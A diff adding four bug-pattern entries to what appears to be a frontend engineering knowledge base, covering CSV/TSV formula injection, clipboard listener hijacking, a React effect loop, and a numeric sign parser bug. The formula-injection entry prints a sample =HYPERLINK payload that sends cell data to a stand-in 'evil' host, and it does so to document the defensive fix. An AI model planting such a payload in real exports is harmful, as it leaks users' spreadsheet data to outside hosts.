@@ -8074,3 +8074,125 @@ Worker authentication assumes the dev-login flow is always available. Production
 - Any worker that calls a guarded internal service must be reviewed for "what happens in prod when dev-login is disabled?" before merging.
 - Add an explicit check on startup: if `app_env=production` and the worker depends on dev-login, fail fast rather than degrade silently.
 - Track this gap in PLAN telemetry — file a P1 ticket the moment the worker ships, not after the audit catches it.
+
+
+---
+
+## BP-304 — Spreadsheet Formula Injection (CWE-1236) in Client-Side TSV/CSV Serialisers
+
+**Affected areas**: any frontend code that serialises rows to TSV/CSV for clipboard or file download. Originated in `apps/worldview-web/components/ui/data-table/data-table.tsx` (`rowsToTsv` / `rowsToCsv`); fixed by extracting to `apps/worldview-web/lib/format/csv-tsv.ts` with `sanitiseFormula`.
+
+**First seen**: 2026-05-01 (PLAN-0059 Wave F QA iter-1, security agent finding).
+
+**Symptoms**:
+- A user-controlled string (e.g. portfolio name `=HYPERLINK("http://evil/?p="&A1,"click")`) flows verbatim into an exported CSV / TSV.
+- Excel / Sheets / Numbers detect a leading `=`, `+`, `-`, `@`, `\t`, or `\r` as a formula and **execute it on open** — no warning. Same payload reaches the user's clipboard via `navigator.clipboard.writeText`, so simply copying selected rows into a spreadsheet propagates the attack.
+
+**Root Cause**:
+Naive cell escaping handles only the standard "quote if contains comma/quote/newline" rule (RFC 4180), but does not address the spreadsheet-specific behavior of leading-character formula execution.
+
+**Fix**:
+```ts
+function sanitiseFormula(s: string): string {
+  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+}
+```
+Apply uniformly to BOTH headers AND cell values across TSV and CSV. The single-quote prefix forces the spreadsheet to treat the cell as a string. Add a test that verifies `=HYPERLINK(...)` does NOT lead the rendered output line.
+
+**Prevention**:
+- Centralise TSV/CSV serialisation in one library (`lib/format/csv-tsv.ts`) so the sanitisation rule has one home.
+- ESLint rule banning ad-hoc CSV/TSV string concatenation in components — they MUST go through the canonical helpers.
+- When any code touches clipboard/download/export of user-controllable data, run a CWE-1236 review.
+
+---
+
+## BP-305 — Document-Level `copy` Listener Hijacks Native Selection Inside Component
+
+**Affected areas**: any component that wants to override clipboard behavior (e.g. DataTable's "selected rows → TSV" feature). Originated in `apps/worldview-web/components/ui/data-table/data-table.tsx`.
+
+**First seen**: 2026-05-01 (PLAN-0059 Wave F QA iter-1, security + correctness agents).
+
+**Symptoms**:
+- Component installs `document.addEventListener("copy", handler)` to override the clipboard payload.
+- User selects PLAIN TEXT inside a cell (e.g. wants to copy a ticker symbol) and presses ⌘C.
+- The handler fires, sees the component has focus, and `e.preventDefault()` + writes the row TSV instead — destroying the user's intended selection.
+
+**Root Cause**:
+1. Listener is at document level, so it fires for every copy event in the page (not just events originating inside the component).
+2. The handler does not check `window.getSelection()` — it overrides regardless of whether a real text selection exists.
+
+**Fix**:
+1. Attach the listener to the COMPONENT'S root element, not document. Copy events bubble from contentEditable / selectable subtrees.
+2. Skip the override when a real text selection exists:
+```ts
+const onCopy = (e: ClipboardEvent) => {
+  const sel = window.getSelection();
+  if (sel && !sel.isCollapsed && sel.toString().length > 0) return; // let native copy
+  // ... override path
+};
+el.addEventListener("copy", onCopy);
+```
+
+**Prevention**:
+- Never use `document`-level clipboard listeners unless the override is intentionally global.
+- Always check `window.getSelection()` before hijacking — text-selection clipboard is a user expectation, not a feature opt-in.
+
+---
+
+## BP-306 — `useEffect` Dependency on Derived-Array Identity → Spurious or Infinite Fires
+
+**Affected areas**: any component that derives an array via `.map(...)` / `getXxxRowModel().rows.map(...)` inside `useMemo` and uses that derived array as a `useEffect` dep. Originated in `apps/worldview-web/components/ui/data-table/data-table.tsx` (`onSelectionChange` notification effect).
+
+**First seen**: 2026-05-01 (PLAN-0059 Wave F QA iter-1, correctness agent).
+
+**Symptoms**:
+- `selectedRows = useMemo(() => table.getSelectedRowModel().rows.map(r => r.original), [rowSelection, data])`.
+- Parent passes a new `data` reference each render (extremely common with TanStack Query refetches).
+- New `data` → memo recomputes → new `selectedRows` array identity → `useEffect([selectedRows])` fires `onSelectionChange` even though selection didn't change.
+- If the consumer's `onSelectionChange` triggers parent state that changes `data`, the loop becomes infinite.
+
+**Root Cause**:
+Effect dep is a derived-array reference, not the underlying state that drives it. Array literal `===` comparison fails on every render that recreates the array.
+
+**Fix**:
+Depend on a STABLE STRING KEY of the underlying state:
+```ts
+const selectionKey = useMemo(() => Object.keys(rowSelection).sort().join(","), [rowSelection]);
+useEffect(() => {
+  const sel = table.getSelectedRowModel().rows.map(r => r.original); // recompute lazily
+  onSelectionChange?.(sel);
+}, [selectionKey, table, onSelectionChange]);
+```
+
+**Prevention**:
+- For `useEffect` deps, prefer the SCALAR state that drives the derived value.
+- For arrays of stable IDs, derive a key string (`ids.sort().join(",")`).
+- Lint rule: flag `useEffect` deps that are array-typed and produced inside the same render.
+
+---
+
+## BP-307 — Compound Sign Operators Double-Negate in Numeric Parser
+
+**Affected areas**: any parser that combines accounting parens (negative) with explicit `-` sign in user input. Originated in `apps/worldview-web/lib/format/parse-shorthand.ts`.
+
+**First seen**: 2026-05-01 (PLAN-0059 final strict QA agent).
+
+**Symptoms**:
+- Input `(-100)` is parsed as `+100` instead of `-100`.
+- Input `(-1.5m)` parsed as `+1_500_000` instead of `-1_500_000`.
+- Cause: parser computed `negate ? -out * signMul : out * signMul`. With `negate=true` AND `signMul=-1`, the formula evaluates to `(-out) * -1 = +out`, silently inverting sign for accounting-style inputs.
+
+**Root Cause**:
+Two boolean indicators of negativity (paren-wrap, explicit `-`) were applied compositionally as if they were independent sign multipliers. They are NOT — accounting `(N)` and `-N` are equivalent representations of the same negative; `(-N)` is non-standard but unambiguously a single negative, not a double.
+
+**Fix**:
+Collapse to a single sign multiplier. Parens override inner sign:
+```ts
+const sign = negate ? -1 : signMul;
+return n * sign;
+```
+
+**Prevention**:
+- For ANY financial / numeric parser that supports multiple sign-syntaxes, write a truth table (paren × inner-sign × leading-+ × negative-suffix) in the test file.
+- Test the FOUR specifically problematic inputs: `(N)`, `-N`, `(-N)`, `(+N)`.
+- In code review, if a parser has both `negate` and `signMul` variables, demand a single derived `sign` and a test asserting all combinations.
